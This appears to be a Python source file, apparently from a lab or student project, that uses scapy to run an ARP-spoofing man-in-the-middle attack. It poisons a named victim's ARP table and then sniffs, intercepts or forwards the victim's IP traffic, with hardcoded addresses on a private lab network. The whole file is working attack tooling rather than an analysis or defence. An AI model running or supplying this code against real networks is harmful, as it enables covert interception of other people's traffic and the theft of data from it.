from scapy.all import *
import arpSpoof
import util
import interceptor


class Arp():
    def __init__(self, networkInterface, victimIP, spoofIP, forward):
        self.networkInterface = networkInterface
        self.victimIP = victimIP
        self.spoofIP = spoofIP
        self.forward = forward
        self.attackerMAC = get_if_hwaddr(networkInterface)
        self.victimMAC = util.getMAC(victimIP, networkInterface) # get victim MAC adress
        self.serverMAC = [util.getMAC(ip, networkInterface) for ip in spoofIP]  # get array of MAC of poisoned ips in victim arp table
        self.interceptedPkt = []

    def startSniff(self):
        sniff(prn=self.intercept, iface=self.networkInterface, filter="ip", timeout = 20)

    def startLoudSniff(self):
        sniff(prn=self.interceptLoud, iface=self.networkInterface, filter="ip", timeout = 20)

    def intercept(self, pkt):
         interceptor.interceptARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC, self.victimMAC, self.networkInterface, self.forward)

    def interceptLoud(self, pkt):
        interceptor.loudARP(pkt, self.interceptedPkt, self.attackerMAC, self.spoofIP, self.serverMAC,
                                 self.victimMAC, self.networkInterface)

    def spoof(self):
        arpSpoof.arpPoisoning(self.victimIP, self.spoofIP, self.networkInterface)


    def start(self, mode):
        if mode:
            self.spoof()
            self.startSniff()
        else:
            self.spoof()
            self.startLoudSniff()



networkInterface = "enp0s3"
victimIP = "192.168.56.101"
#victimMAC = "08:00:27:b0:a1:ab"

spoofIP = "192.168.56.104"
#serverMAC = "08:00:27:c6:a4:61"


# test = Arp(networkInterface, [victimIP], [spoofIP])
#
# test.start()